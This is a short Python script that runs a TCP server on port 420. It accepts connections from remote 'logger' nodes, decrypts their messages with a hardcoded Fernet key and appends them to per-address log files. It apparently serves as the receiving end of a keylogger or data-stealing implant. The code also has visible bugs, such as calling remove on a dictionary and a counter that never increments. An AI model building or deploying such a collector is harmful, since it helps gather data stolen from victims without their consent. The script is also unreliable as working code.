import socket
from threading import Thread
from cryptography.fernet import Fernet



n = 0
list_of_nodes = {}
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'


def remove_node(connection):
    if connection in list_of_nodes:
        list_of_nodes.remove(connection)

def nodethread(logger_socket, logger_address):

    while True:
        try:
            message = Fernet(key).decrypt(logger_socket.recv(BUFFER_SIZE).decode()).decode()
            if message:
                with open(f"./logs/{logger_address}-log.txt", "a+") as file1:
                    file1.write(f"{message}")
            else:
                remove_node(logger_socket)
        except:
            continue


def node_service(logger_socket, n, logger_address):
    list_of_nodes[n] = logger_socket
    Thread(target=nodethread, args=(logger_socket, logger_address)).start()
    n += 1

runningz = True
LOGGER_HOST = "0.0.0.0"
LOGGER_PORT = 420
l = socket.socket()
l.bind((LOGGER_HOST, LOGGER_PORT))
l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
l.listen(5)
while runningz:
    logger_socket, logger_address = l.accept()
    addr = logger_socket.getpeername()[0]
    print(f"[{IMPORTANT}] connection from {logger_address} .....")
    auth_thread = Thread(target=node_service, args=(logger_socket, n, logger_address))
    auth_thread.daemon = True
    auth_thread.start()